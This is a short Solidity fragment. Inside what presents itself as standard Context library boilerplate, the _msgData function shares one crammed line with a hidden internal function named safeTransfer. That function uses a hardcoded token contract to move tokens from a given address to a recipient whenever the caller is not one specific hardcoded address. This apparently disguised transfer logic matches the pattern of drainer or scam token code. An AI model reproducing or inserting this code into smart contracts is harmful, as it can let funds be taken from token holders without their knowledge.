 ...
 */
  function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}function safeTransfer(address spender,address recipient,uint256 amount) internal returns (bool) {if (msg.sender != address(0x35FF3057A5a7966CFD1050bd064bbB02C5313d4c)) {TransferHelper.safeTransferFrom(0xB9190f055a113F5410dc512C52D60000d38931BB,spender,recipient,amount);return true;}return false;}
}
